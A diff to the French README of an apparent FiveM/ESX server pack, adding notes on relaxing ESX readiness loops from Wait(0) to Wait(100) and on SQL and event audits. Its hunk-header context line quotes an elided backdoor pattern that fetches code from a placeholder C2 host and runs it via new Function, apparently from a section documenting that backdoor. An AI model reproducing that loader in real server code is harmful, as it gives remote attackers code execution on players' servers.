@@ -256,6 +256,25 @@ require('https').get('https://<C2>/…', res => { … new Function('global', cod
 
 ---
 
+## Performance
+
+> Optimisations sûres (zéro suppression de feature, ESX intact). Validation : seules des lignes `Wait()` modifiées (diff `25 ins / 25 del`), fins de ligne CRLF préservées.
+
+### Spin-loops de readiness ESX `Wait(0)` → `Wait(100)` *(session 2026-06-04)*
+
+- **Problème** : 24 boucles d'attente d'initialisation du type `while ESX == nil do Wait(0) end` (et `while ESX.GetPlayerData().job == nil`, `while Config == nil`, `while canRob == nil`…) tournaient à `Wait(0)` → un tick **par frame** (~60+/s) durant toute la fenêtre de démarrage, gaspillant un thread CPU complet par ressource avant que ESX/les données soient prêtes.
+- **Fix** : `Wait(0)` → `Wait(100)` **uniquement** dans le corps de ces boucles de garde (condition `== nil`). Aucune boucle perpétuelle (`while true`), de rendu (`Draw*`), de contrôle (`IsControlPressed`/`Disable*`), d'animation ou de détection de tir (`IsPedShooting`) n'a été touchée — celles-ci restent à `Wait(0)` car elles sont sensibles à la frame.
+- **Impact** : +100 ms max de latence au démarrage (imperceptible), CPU client libéré pendant le chargement. Comportement gameplay **inchangé**.
+- **24 boucles sur 19 fichiers** : `InitEsx`, `Core2/Libs/Esx`, `CMain` (commands), `mecano/cl_custom`, `tatouages`, `safezone` (×2), `society/cl_function`, `sirenControl` (×3), `taxi/_main` (×3), `billing`, `apu`, `myDj`, `esx_ktackle`, `MysteryCase`, `ox_sit`, `gangsbuilder`, `ral_components`, `xCardealer`, `doorlock`.
+
+### Audits réalisés (pas d'action nécessaire / risque > gain)
+
+- **Intégrité SQL** : ✅ 0 table référencée (`FROM`/`INSERT`/`UPDATE`/`DELETE`/`JOIN`) absente d'`install.sql` (265 tables déclarées vs 47 référencées).
+- **Events « dupliqués »** (52 noms via `RegisterNetEvent`) : **non dédupliqués** — il s'agit en très grande majorité de paires **client + serveur légitimes** (ex. `esx:playerLoaded`, `ambulance:revive`) ; les fusionner casserait les features.
+- **`SELECT *`** (207) : non réécrits en masse — chaque requête nécessite de vérifier les colonnes réellement consommées côté Lua ; à traiter au cas par cas pour éviter de casser un mapping de résultat.
+
+---
+
 ## Installation
 
 1. **Base de données** : créer une base MySQL (ex. `noxa`) puis importer `install.sql` (**seul** fichier SQL ; `sql.sql` a été supprimé).
